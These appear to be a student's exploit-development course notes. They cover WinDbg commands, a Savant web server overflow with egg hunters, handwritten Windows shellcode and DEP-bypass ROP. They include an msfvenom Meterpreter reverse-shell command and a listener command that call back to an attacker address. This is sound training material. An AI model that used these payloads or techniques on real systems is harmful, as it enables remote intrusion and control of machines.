xfreerdp /u:Offsec /p:lab /v:192.168.115.10 /dynamic-resolution

---------------------------------------
Windbg views:
	1. Disassembly 2. Registers 3. Command

---------------------------------------
Windbg cmds:

1.	g
	p = Step Over
	t = Step into
	pt = Step over until return
	pc = Step out

2. dds @esp L5

3.	.load narly
	!nmod

4. dc poi(esp+4)

5. s -d 0 L?80000000 41414141
   s -a 0 L?80000000 "This program cannot be run in DOS mode"
   s -[1]b 00400000 00452000 58 c3 (search: pop eax ret)
   s -a 0x0 L?80000000 w00tw00t

6. r (show registers)
   r ecx=41414141

7. bp kernel32!WriteFile
   bl
   bd 0 (disable index 0)
   be 0 (enable index 0)
   bu ole32!WriteStringStream (breakpoint on an unresolved function)
   bp kernel32!WriteFile ".printf \"The number of bytes written is: %p\", poi(esp + 0x0C);.echo;g"
   bp kernel32!WriteFile ".if (poi(esp + 0x0C) != 4) {gc} .else {.printf \"The number of bytes written is 4\";.echo;}"

   ba e 1 kernel32!WriteFile (hardware breakpoint, e (execute), r (read), or w (write))

8. lm m kernel*
9. x kernelbase!CreateProc* (exam symbols)

10. ? 77269bc0  - 77231430
	? 77269bc0 >> 18

11. ? 41414141
	? 0n41414141
	? 0y1110100110111
	.formats 41414141

12. u poi(@esp+0x04) (disassembly from (esp+4) pointed address)

13. !teb

14. !address 01365a5e (information about certain address)

15. lm m ntdll

16. !vprot eip

---------------------------------------
Linux cmds:

1.	msf-pattern_create -l 800

2. 	msf-nasm_shell

3. a: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python -v  payload
   b: sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.119.120; set LPORT 443; exploit"
	
---------------------------------------

Keystone:
	sudo apt install python3-pip
	pip install keystone-engine

---------------------------------------

m-6 (Savant):
	1. esp+4 points to the buffer.
	2. pop eax, ret. to jmp to buffer.
	3. 'GET' at start of buffer change to \xeb\x17\x90\x90,
		which is short jmp next 0x17 bytes. (not work)
	4. another way: httpMethod = b"\x31\xC9\x85\xC9\x0F\x84\x11" + b" /"  # xor ecx, ecx; test ecx, ecx; je 0x17
	(all jmp 0x17 from beginning address of current assembly)
	5.  rather than terminating the HTTP request, we could add an additional buffer after the first carriage return (\r) and new-line (\n), search its magic bytes "w00tw00t" in memory, found it is on heap.
	6. Keystone Engine to find additional buffer on heap.
	7. egg hunt (crawls through the entire memory space for magic bytes)
		Keystone Engine: embed assembly code in python poc, not using hex code directly.
		python: from keystone import *
		issue to combat: no way of telling beforehand if a memory page is mapped
			use NtAccessCheckAndAuditAlarm (system call did not change until Windows 8)
			ref: https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FSecurity%2FNtAccessCheckAndAuditAlarm.html
			if has access: return STATUS_NO_IMPERSONATION_TOKEN
			if not: STATUS_ACCESS_VIOLATION 
	8. reverse shell: msfvenom
	9. because NtAccessCheckAndAuditAlarm system call chages by Windows version, use SEH egg hunter.

---------------------------------------

m-7 Custom Shellcode (t !!)
	1. ctype & keystone, make windows api calls
	2. LoadLibraryA, GetModuleHandleA, GetProcAddress
	3. problem: need to know addresses of step 2.
	4. Understanding Windows Shellcode: 
		https://www.hick.org/code/skape/papers/win32-shellcode.pdf
	Win32 Assembly Components:
		https://www.offsec.com/awe/AWEPAPERS/winasm-1.0.1.pdf
	5. 3 methods: PEB, SEH, "Top Stack", only talks PEB.
	6. PEB method, test on windbg:
		dt nt!_TEB @$teb 
			(view teb)
		dt nt!_PEB 0x7f60b000 
			(view PEB address read from teb, PEB addr at offset 0x30 of the TEB)
		dt _PEB_LDR_DATA 0x776c9aa0 
			(view _PEB_LDR_DATA from nt!_PEB)
			found: InLoadOrderModuleList, InMemoryOrderModuleList, InInitializationOrderModuleList
		dt _LIST_ENTRY (0x776c9aa0 + 0x1c) 
			(view InInitializationOrderModuleList)
		dt _LDR_DATA_TABLE_ENTRY (0x04011658 - 0x10) 
			(subtract 0x10 from _LIST_ENTRY to reach _LDR_DATA_TABLE_ENTRY_ structure)
			it contains: 
				1. +0x018 DllBase          : 0x775c0000 Void
				2. +0x02c BaseDllName      : _UNICODE_STRING "ntdll.dll"

	7. write shell code of step 6 by keystone, check dll name length.  "kernel32.dll" string is 12 bytes UNICODE 
		check the 25th byte is NULL. If the comparison fails, take a conditional jump to next_module and check.

	Found base addr of kernel32.dll; next goal: dynamically resolving TerminateProcess using Export Directory Table

	8. find the DataDirectory, which holds information about the Export Directory Table
		dt ntdll!_IMAGE_DOS_HEADER 0x76e40000  (pe header shows at 0x3c, with value 0xf8)
		dt ntdll!_IMAGE_NT_HEADERS 0x76e40000 + 0xf8 (OptionalHeader shows at 0x18)
		dt ntdll!_IMAGE_OPTIONAL_HEADER 0x76e40000 + 0xf8 + 0x18 (DataDirectory shows at 0x60)
	9. verify it:
		a. dt ntdll!_IMAGE_DATA_DIRECTORY 0x76e40000 + 0xf8 + 0x18 + 0x60
		b. !dh -f kernel32
	10. build reverse shell using ws2_32.dll: WSAStartup, WSASocket, WSAConnect, CreateProcessA.


---------------------------------------

m-10 Stack Overflows and DEP Bypass

	1. a. can be configed in:  boot.ini (Windows XP) or bcdedit.exe
		b. 4 modes: OptIn, OptOut, AlwaysOn, AlwaysOff.
		c. ntdll.dll -> LdrpCheckNXCompatibility
	2. !vprot eip (display the memory protections of eip, another eg. !vprot esp)
	3. .load narly
		!nmod
	4. test:
		a. ed esp 90909090 (change assembly esp points to to nop)
		b. r eip = esp
		c. p (Access violation - code c0000005)
	5. In 2009, Microsoft released the Enhanced Mitigation Experience Toolkit (EMET)
		From Windows 10 and forward, EMET embedded in the os and renamed to Windows Defender Exploit Guard (WDEG)
		Enable DEP of target exe in Windows Defender Security Center (use WDEG)
	6. ROP method 1: use NtSetInformationProcess api to disable DEP, then jump to shellcode again.
			windows mitigation: Permanent DEP. (executable linked with the _/NXCOMPAT__ flag during compilation)
		ROP method 2: uses the WinExec function to execute commands
			(not as effective as having arbitrary shellcode execution)
	7. return to any instruction sequence in the executable memory pages that ends with a return.
		

